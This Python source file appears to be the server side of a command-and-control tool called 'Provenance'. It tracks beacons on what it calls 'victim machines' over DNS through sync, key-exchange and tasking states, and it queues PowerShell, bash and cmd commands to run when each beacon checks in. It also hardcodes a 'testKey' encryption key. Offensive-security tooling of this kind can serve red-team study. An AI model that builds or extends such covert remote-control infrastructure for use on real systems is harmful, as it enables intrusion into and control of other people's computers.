from socketserver import BaseRequestHandler
from backend.handlers.protocolhandler import ProtocolHandler
from backend.handlers.resolution import Resolution
from collections import deque
from datetime import datetime
from enum import Enum
import logging
from typing import Union
from util.structs import CommandType, Command

class States(Enum):
    SYNC    = 0
    ENCRYPT = 1
    READY   = 2
    FRAGMENTS = 3

class DNSClient(BaseRequestHandler):

    _client_count = 0

    """ Builtin Functions"""

    def __init__(self, request, client_address, serverinfo, hostname=None):
        self.logger = logging.getLogger("Provenance")
        # Superclass initialization
        self.request = request
        self.client_address = client_address
        self.server = serverinfo
        # Subclass Initialization
        self._uuid = None
        self._hostname = hostname or f"Client_{DNSClient._client_count}"
        self._os = ""
        self._queued_commands = deque()
        self._sent_commands = []
        self._command_count = 0
        self._last_active: Union[datetime, None] = None
        self._key: str = "testKey"
        self._protocol_handler = None
        self._state = States.SYNC
        self._ip = "?.?.?.?"
        
        self._protocol_handler = Resolution(
            ip=client_address[0],
            socket=request[1] if request else None
        )
        DNSClient._client_count += 1

    def __repr__(self):
        return f"ResolutionClient{{{self._uuid}, {self.client_address[0]}}}"
    
    @classmethod
    def parse_uuid(cls, request):
        return Resolution.parse_uuid(request)
        

    def decode(self, data):
        os = data["os"]
        hostname = data["hostname"]
        ip = data["ip"]
        commands = data["commands"]
        state = data["state"]
        key = data["key"]
        uuid = data["uuid"]

        self._uuid = uuid
        self._protocol_handler = Resolution(ip, None)
        self._os = os
        self._hostname = hostname
        self.client_address = (ip, None)
        self._last_active = None
        self._state = States(state)
        self._key = key
        if commands:
            for c in commands:
                self.queue_command(
                    ctype=c["type"],
                    cmd=c["command"]
                )
            # TODO: change uid to not numbers so we don't have to update UID to correct value
            self._command_count = int(commands[-1]["uid"])

    def encode(self):
        return {
            "uuid:": self._uuid,
            "os": self.os,
            "hostname": self._hostname,
            "ip": self._ip,
            "active": self.last_active,
            "state": self._state.value,
            "key": self._key,
            "commands": [Command.encode(c) for c in self._queued_commands]
        }

    # Application-Based Methods

    def handle(self, uuid, request, client_address):
        """
        The method required by BaseRequestHandler that handles the
        incoming request. Will tell the underlying protocol
        handler (DNS, HTTP, ICMP, etc) to send the given command if there
        is one queued, else send NOP
        :return:  None
        """
        # Update the details of the client
        self.client_address = client_address
        self.request = request
        # If dont have a protocol handler, we added the
        # machine manually OR  we are restoring from backup
        # Either case we don't have an active socket and must 
        # use the socket from the incoming request
        if self._protocol_handler.socket is None:
            self._protocol_handler.socket = request[1]
        
        _, port = self.client_address
        self._last_active = datetime.now()


        # When first synchronzing with the server, both the client and server
        # should be in the SYNC state. During this phase, the beacon will  
        # reach out to Provenance first and send over host and OS information
        if self._state == States.SYNC:
            response = self._protocol_handler.synchronize(self.request, port)
            if response:
                self._os = response[0]
                self._hostname = response[1]
                self._uuid = response[2]
                self._state = States.ENCRYPT
                self.logger.debug(f"{self._hostname}: SYNC CONFIRMED")

        # After Synchronization, the client will request an encryption key
        # to encrypt communications between the client and Provenance
        elif self._state == States.ENCRYPT:
            next_state = States(self._protocol_handler.encrypt(self.request, port, self._key))
            if next_state == States.READY:
                self._state = States.READY
                self.logger.debug(f"{self._hostname}: KEY RECEIPT CONFIRMED")
            else:
                self._state = next_state

        # After transferring the encryption key, the server is ready to receive
        # request for commands
        elif self._state == States.READY:
            if self._queued_commands:
                next_cmd = self._queued_commands.popleft()
            else:
                next_cmd = Command(CommandType.NOP)
            
            state = self._protocol_handler.respond(self.request, port, next_cmd)
            next_state = States(state)
            # If there is a valid request send the command
            if next_state == States.READY:
                self._sent_commands.append((self._command_count, next_cmd))
            else:
                # If there has been an error, add the popped command back
                if next_cmd.type != CommandType.NOP:
                    self._queued_commands.appendleft(next_cmd)
                self._state = next_state

        # Fragments is a special state theat indicates that long commands
        # should be split up into multiple Packets and should only be used
        # for UDP protocols. 
        elif self._state == States.FRAGMENTS:
            state = self._protocol_handler.respond(self.request, port, None)
            if state == 2:
                self._state = States.READY
            else:
                pass

        else:
            # Shouldn't happen
            raise ValueError("ProvenanceClient State {self._state} invalid.")

    def queue_command(self, ctype, cmd):
        """
        The server method used to interact with the underyling
        model representing the victim machine. Will queue a
        command to be sent next time the beacon calls back
        :param ctype: type of command :module: protocolhandler.Commands
        :param cmd: the command to be sent
        :return: None
        """
        convert = {"ps": CommandType.PS, "bash": CommandType.BASH, "cmd": CommandType.CMD}
        command_type = convert[ctype]
        self._queued_commands.append(Command(command_type, cmd, self._command_count))
        self._command_count += 1

    def remove_command(self, cmd_id):
        """
        The server method used to interact with the underyling
        model representing the victim machine. Will queue a
        command to be sent next time the beacon calls back
        :param cmd_id: the id of the command to be deleted
        :return: None
        """
        for cmd in self._queued_commands:
            if cmd.uid == cmd_id:
                self._queued_commands.remove(cmd)

    # Backend Methods for model querying

    @property
    def os(self):
        return self._os

    @property
    def queued_commands(self):
        return self._queued_commands

    @property
    def get_sent_commands(self):
        return self._sent_commands

    @property
    def last_active(self):
        # TODO: change to be datetime object not string
        # TODO: and convert encode
        if not self._last_active:
            return None
        else:
            delta = datetime.now() - self._last_active
            return delta.seconds // 60

    @property
    def get_command_count(self):
        return self._command_count

    @property
    def hostname(self):
        return self._hostname

    @property
    def ip(self):
        return self._ip

    @property
    def beacon(self):
        if self._protocol_handler:
            return self._protocol_handler.__repr__()
        return None
    
    @property
    def uuid(self):
        return self._uuid
